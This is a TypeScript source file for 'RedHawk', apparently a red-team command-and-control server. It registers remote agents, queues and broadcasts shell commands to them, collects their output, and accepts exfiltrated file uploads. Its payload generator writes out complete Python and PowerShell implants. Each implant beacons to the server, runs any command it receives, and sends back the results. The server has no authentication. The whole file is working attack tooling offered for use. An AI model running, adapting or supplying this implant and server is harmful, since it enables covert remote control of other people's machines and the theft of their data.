/**
 * RedHawk — C2 Server (Command & Control)
 *
 * A lightweight HTTP/HTTPS C2 server that:
 *   - Listens for agent callbacks (HTTP POST)
 *   - Registers and tracks agents
 *   - Queues commands for agents
 *   - Collects task results
 *   - Provides a REST API + WebSocket for the UI
 *
 * Agent protocol:
 *   POST /c2/checkin  — agent heartbeat & command fetch
 *   POST /c2/result   — agent posts task output
 *   POST /c2/upload   — agent uploads exfiltrated files
 *   GET  /c2/poll     — agent polls for new tasks (long-poll fallback)
 */

import * as http from 'http';
import * as https from 'https';
import * as fs from 'fs';
import * as path from 'path';
import * as url from 'url';
import { EventEmitter } from 'events';

export interface C2Agent {
  id: string;
  hostname: string;
  username: string;
  os: string;
  ip: string;
  firstSeen: string;
  lastCheckin: string;
  status: 'online' | 'offline' | 'dead';
  tasks: C2Task[];
}

export interface C2Task {
  id: string;
  agentId: string;
  command: string;
  status: 'queued' | 'sent' | 'completed' | 'failed';
  result: string | null;
  createdAt: string;
  completedAt: string | null;
}

export interface C2Config {
  listenHost: string;
  listenPort: number;
  sslCert?: string;
  sslKey?: string;
  useHttps: boolean;
  killDate: string;
  jitter: number;
  userAgent: string;
}

const DEFAULT_CONFIG: C2Config = {
  listenHost: '0.0.0.0',
  listenPort: 8080,
  useHttps: false,
  killDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(), // 30 days
  jitter: 3,
  userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
};

export class C2Server extends EventEmitter {
  private config: C2Config;
  private server: http.Server | https.Server | null = null;
  private agents: Map<string, C2Agent> = new Map();
  private tasks: Map<string, C2Task> = new Map();
  private running = false;
  private pollClients: Map<string, any[]> = new Map(); // agentId -> response queue

  constructor(config: Partial<C2Config> = {}) {
    super();
    this.config = { ...DEFAULT_CONFIG, ...config };
  }

  start(): Promise<boolean> {
    return new Promise((resolve) => {
      if (this.running) {
        resolve(true);
        return;
      }

      const handler = this.handleRequest.bind(this);

      if (this.config.useHttps && this.config.sslCert && this.config.sslKey) {
        try {
          const options = {
            cert: fs.readFileSync(this.config.sslCert),
            key: fs.readFileSync(this.config.sslKey),
          };
          this.server = https.createServer(options, handler);
        } catch (err: any) {
          this.emit('error', `SSL setup failed: ${err.message}`);
          resolve(false);
          return;
        }
      } else {
        this.server = http.createServer(handler);
      }

      this.server.listen(this.config.listenPort, this.config.listenHost, () => {
        this.running = true;
        this.emit('started', {
          host: this.config.listenHost,
          port: this.config.listenPort,
          https: this.config.useHttps,
        });
        resolve(true);
      });

      this.server.on('error', (err: Error) => {
        this.running = false;
        this.emit('error', err.message);
        resolve(false);
      });
    });
  }

  stop(): void {
    if (this.server) {
      this.server.close();
      this.server = null;
    }
    this.running = false;
    this.emit('stopped');
  }

  isRunning(): boolean {
    return this.running;
  }

  getConfig(): C2Config {
    return { ...this.config };
  }

  updateConfig(updates: Partial<C2Config>): void {
    this.config = { ...this.config, ...updates };
  }

  getAgents(): C2Agent[] {
    return Array.from(this.agents.values()).map((a) => ({
      ...a,
      tasks: a.tasks.slice(-10), // Only last 10 tasks for listing
    }));
  }

  getAgent(id: string): C2Agent | undefined {
    return this.agents.get(id);
  }

  getTasks(agentId?: string): C2Task[] {
    if (agentId) {
      return Array.from(this.tasks.values()).filter((t) => t.agentId === agentId);
    }
    return Array.from(this.tasks.values());
  }

  /**
   * Queue a command for a specific agent
   */
  queueCommand(agentId: string, command: string): C2Task | null {
    const agent = this.agents.get(agentId);
    if (!agent) return null;

    const task: C2Task = {
      id: `task_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
      agentId,
      command,
      status: 'queued',
      result: null,
      createdAt: new Date().toISOString(),
      completedAt: null,
    };

    this.tasks.set(task.id, task);
    agent.tasks.push(task);

    this.emit('taskQueued', task);
    return task;
  }

  /**
   * Queue a command for ALL online agents
   */
  broadcastCommand(command: string): C2Task[] {
    const tasks: C2Task[] = [];
    for (const [id, agent] of this.agents) {
      if (agent.status === 'online') {
        const task = this.queueCommand(id, command);
        if (task) tasks.push(task);
      }
    }
    return tasks;
  }

  /**
   * Generate agent payload (Python one-liner)
   */
  generateAgentPayload(agentType: 'python' | 'powershell'): string {
    const host = this.config.listenHost === '0.0.0.0' ? '127.0.0.1' : this.config.listenHost;
    const proto = this.config.useHttps ? 'https' : 'http';
    const serverUrl = `${proto}://${host}:${this.config.listenPort}`;

    if (agentType === 'powershell') {
      return `
# RedHawk C2 Agent — PowerShell
$c2Url = "${serverUrl}"
$agentId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
$hostname = hostname
$username = whoami
$os = (Get-CimInstance Win32_OperatingSystem).Caption

# Checkin loop
while($true) {
  try {
    $body = @{id=$agentId; hostname=$hostname; username=$username; os=$os} | ConvertTo-Json
    $response = Invoke-RestMethod -Uri "$c2Url/c2/checkin" -Method POST -Body $body -ContentType "application/json"
    
    if($response.task -and $response.task.command) {
      $cmd = $response.task.command
      try {
        $output = Invoke-Expression $cmd 2>&1 | Out-String
      } catch { $output = $_.Exception.Message }
      
      $result = @{taskId=$response.task.id; agentId=$agentId; output=$output; status="completed"} | ConvertTo-Json
      Invoke-RestMethod -Uri "$c2Url/c2/result" -Method POST -Body $result -ContentType "application/json"
    }
    
    Start-Sleep -Seconds 5
  } catch { Start-Sleep -Seconds 10 }
}
`.trim();
    }

    // Python agent (default)
    return `
import urllib.request
import urllib.parse
import json
import socket
import subprocess
import sys
import time
import uuid

C2_URL = "${serverUrl}"
AGENT_ID = uuid.uuid4().hex[:8]
HOSTNAME = socket.gethostname()
USERNAME = subprocess.check_output('whoami', shell=True).decode().strip()
OS_INFO = sys.platform

while True:
    try:
        data = json.dumps({"id": AGENT_ID, "hostname": HOSTNAME, "username": USERNAME, "os": OS_INFO}).encode()
        req = urllib.request.Request(f"{C2_URL}/c2/checkin", data=data,
            headers={"Content-Type": "application/json"},
            method="POST")
        
        with urllib.request.urlopen(req, timeout=30) as resp:
            response = json.loads(resp.read().decode())
        
        if response.get("task") and response["task"].get("command"):
            cmd = response["task"]["command"]
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60).decode()
            except Exception as e:
                output = str(e)
            
            result = json.dumps({"taskId": response["task"]["id"], "agentId": AGENT_ID, "output": output, "status": "completed"}).encode()
            urllib.request.urlopen(f"{C2_URL}/c2/result", data=result, headers={"Content-Type": "application/json"})
        
        time.sleep(5)
    except Exception:
        time.sleep(10)
`.trim();
  }

  /**
   * Handle incoming HTTP requests
   */
  private handleRequest(req: http.IncomingMessage, res: http.ServerResponse) {
    const parsed = url.parse(req.url || '', true);
    const pathname = parsed.pathname;

    // CORS headers for Web UI
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
      res.writeHead(204);
      res.end();
      return;
    }

    // Parse body
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      try {
        switch (pathname) {
          case '/c2/checkin':
            this.handleCheckin(body, res, req);
            break;
          case '/c2/result':
            this.handleResult(body, res);
            break;
          case '/c2/upload':
            this.handleUpload(req, body, res);
            break;
          case '/c2/poll':
            this.handlePoll(parsed.query, res);
            break;
          default:
            // REST API for the Electron UI
            if (pathname?.startsWith('/api/')) {
              this.handleApi(pathname, parsed.query, body, req.method || 'GET', res);
            } else {
              res.writeHead(404, { 'Content-Type': 'application/json' });
              res.end(JSON.stringify({ error: 'not found' }));
            }
        }
      } catch (err: any) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: err.message }));
      }
    });
  }

  private handleCheckin(body: string, res: http.ServerResponse, req?: http.IncomingMessage) {
    const data = JSON.parse(body);
    const { id, hostname, username, os, ip } = data;

    if (!id) {
      res.writeHead(400);
      res.end(JSON.stringify({ error: 'missing agent id' }));
      return;
    }

    const now = new Date().toISOString();
    let agent = this.agents.get(id);

    if (!agent) {
      agent = {
        id,
        hostname: hostname || 'unknown',
        username: username || 'unknown',
        os: os || 'unknown',
        ip: ip || req?.socket?.remoteAddress || '',
        firstSeen: now,
        lastCheckin: now,
        status: 'online',
        tasks: [],
      };
      this.agents.set(id, agent);
      this.emit('newAgent', agent);
    } else {
      agent.lastCheckin = now;
      agent.status = 'online';
      agent.ip = ip || agent.ip;
      agent.hostname = hostname || agent.hostname;
      agent.username = username || agent.username;
      if (hostname) agent.hostname = hostname;
      this.emit('agentUpdate', agent);
    }

    // Find next queued task
    const nextTask = agent.tasks.find((t) => t.status === 'queued');
    const response: any = { status: 'ok', agentId: id };

    if (nextTask) {
      nextTask.status = 'sent';
      nextTask.completedAt = new Date().toISOString();
      response.task = { id: nextTask.id, command: nextTask.command };
      this.emit('taskSent', nextTask);
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(response));
  }

  private handleResult(body: string, res: http.ServerResponse) {
    const data = JSON.parse(body);
    const { taskId, agentId, output, status } = data;

    const task = this.tasks.get(taskId);
    if (task) {
      task.status = status || 'completed';
      task.result = output || '';
      task.completedAt = new Date().toISOString();
      this.emit('taskResult', task);
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok' }));
  }

  private handleUpload(req: http.IncomingMessage, body: string, res: http.ServerResponse) {
    try {
      const boundary = req.headers['content-type']?.split('boundary=')[1];
      if (boundary) {
        // Parse multipart — for simplicity, save raw
        const uploadDir = path.join(process.cwd(), 'c2_uploads');
        if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
        const filename = `upload_${Date.now()}.bin`;
        fs.writeFileSync(path.join(uploadDir, filename), body);
        this.emit('fileUploaded', { filename, size: body.length });
      } else {
        // JSON with base64
        const data = JSON.parse(body);
        if (data.filename && data.content) {
          const uploadDir = path.join(process.cwd(), 'c2_uploads');
          if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
          const buffer = Buffer.from(data.content, 'base64');
          fs.writeFileSync(path.join(uploadDir, data.filename), buffer);
          this.emit('fileUploaded', { filename: data.filename, size: buffer.length });
        }
      }
    } catch (err: any) {
      this.emit('error', `Upload error: ${err.message}`);
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok' }));
  }

  private handlePoll(query: any, res: http.ServerResponse) {
    const agentId = query.id as string;
    if (!agentId) {
      res.writeHead(400);
      res.end(JSON.stringify({ error: 'missing agent id' }));
      return;
    }

    const agent = this.agents.get(agentId);
    if (!agent) {
      res.writeHead(404);
      res.end(JSON.stringify({ error: 'agent not found' }));
      return;
    }

    // Long-poll: hold connection until a task is available or timeout
    const timeout = setTimeout(() => {
      if (this.pollClients.has(agentId)) {
        this.pollClients.set(agentId, (this.pollClients.get(agentId) || []).filter((r) => r !== res));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'timeout' }));
      }
    }, 25000);

    const nextTask = agent.tasks.find((t) => t.status === 'queued');
    if (nextTask) {
      clearTimeout(timeout);
      nextTask.status = 'sent';
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ status: 'ok', task: { id: nextTask.id, command: nextTask.command } }));
      return;
    }

    // Hold connection
    if (!this.pollClients.has(agentId)) {
      this.pollClients.set(agentId, []);
    }
    this.pollClients.get(agentId)!.push({ res, timeout });
  }

  private handleApi(pathname: string, query: any, body: string, method: string, res: http.ServerResponse) {
    const respond = (data: any, code = 200) => {
      res.writeHead(code, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(data));
    };

    try {
      switch (pathname) {
        case '/api/status':
          respond({ running: this.running, agents: this.agents.size, tasks: this.tasks.size, config: this.config });
          break;

        case '/api/agents':
          respond(this.getAgents());
          break;

        case '/api/config':
          if (method === 'POST') {
            const updates = JSON.parse(body);
            this.updateConfig(updates);
            respond({ status: 'ok', config: this.config });
          } else {
            respond(this.config);
          }
          break;

        case '/api/tasks':
          respond(this.getTasks(query.agentId as string));
          break;

        default:
          respond({ error: 'unknown endpoint' }, 404);
      }
    } catch (err: any) {
      respond({ error: err.message }, 500);
    }
  }
}
